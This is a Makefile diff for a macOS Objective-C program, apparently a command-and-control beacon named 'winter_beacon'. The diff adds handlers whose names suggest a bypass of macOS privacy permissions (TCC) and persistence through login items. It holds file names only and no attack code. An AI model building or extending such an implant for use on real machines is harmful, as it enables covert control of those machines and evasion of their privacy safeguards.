@@ -5,7 +5,7 @@ LDFLAGS = -framework Foundation -framework Security -framework AppKit
 # Source files
 SOURCES = main.m ZBeacon.m ZAPIClient.m ZSSLBypass.m ZSystemInfo.m \
           ZCommandModel.m ZCommandHandler.m ZCommandRegistry.m ZCommandService.m \
-          commands/ZEchoCommandHandler.m commands/ZDialogCommandHandler.m commands/ZWhoAmICommandHandler.m
+          commands/ZEchoCommandHandler.m commands/ZDialogCommandHandler.m commands/ZWhoAmICommandHandler.m commands/ZTCCJackCommandHandler.m commands/ZLoginItemCommandHandler.m commands/ZTCCCheckCommandHandler.m
 OBJECTS = $(SOURCES:.m=.o)
 TARGET = winter_beacon
 
